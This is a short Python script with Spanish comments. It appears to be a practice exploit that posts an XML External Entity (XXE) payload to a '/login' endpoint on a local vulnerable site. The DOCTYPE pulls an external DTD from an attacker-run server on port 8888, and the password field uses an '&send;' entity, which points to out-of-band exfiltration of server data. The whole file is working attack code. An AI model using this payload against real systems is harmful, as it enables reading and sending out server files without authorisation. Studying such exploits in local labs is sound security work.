# pip install requests
import requests

# Primero se inicia servidor personal con python -m http.server 8888

sitio_vulnerable = "http://127.0.0.1:8000"
headers = {'Content-Type': 'application/xml'}
request_body = \
"""
<!DOCTYPE datosSesion SYSTEM "http://127.0.0.1:8888/inyeccion.dtd">
<datosSesion>
	<username>Jose</username>
	<password>&send;</password>
</datosSesion>
"""
response = requests.post(f"{sitio_vulnerable}/login", headers=headers, data=request_body)
print(response.content)